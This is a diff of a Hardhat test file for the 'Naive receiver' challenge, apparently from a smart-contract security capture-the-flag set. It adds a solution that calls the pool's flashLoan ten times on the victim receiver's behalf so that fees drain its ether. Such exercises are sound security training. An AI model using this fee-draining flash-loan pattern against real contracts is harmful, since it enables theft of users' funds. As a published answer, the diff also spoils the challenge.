@@ -1,6 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
-
+ 
 describe('[Challenge] Naive receiver', function () {
     let deployer, user, player;
     let pool, receiver;
@@ -38,6 +38,10 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const ETH = await pool.ETH();
+        for(let i=0; i<10; i++) {
+            await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
+        }
     });
 
     after(async function () {
